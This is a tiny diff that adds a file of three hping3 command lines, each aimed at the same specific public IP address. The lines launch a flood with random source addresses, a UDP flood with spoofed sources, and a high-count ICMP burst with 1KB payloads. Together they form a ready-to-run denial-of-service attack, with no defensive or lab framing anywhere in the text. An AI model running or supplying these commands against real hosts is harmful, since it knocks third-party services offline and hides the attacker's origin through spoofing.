@@ -1,0 +1,5 @@
+hping3 178.128.232.201 -c 10000 --flood --rand-source
+
+hping3 178.128.232.201 -c 9000 --udp --spoof
+
+hping3 178.128.232.201 -c 11000 --icmp -i 75 -d 1KB
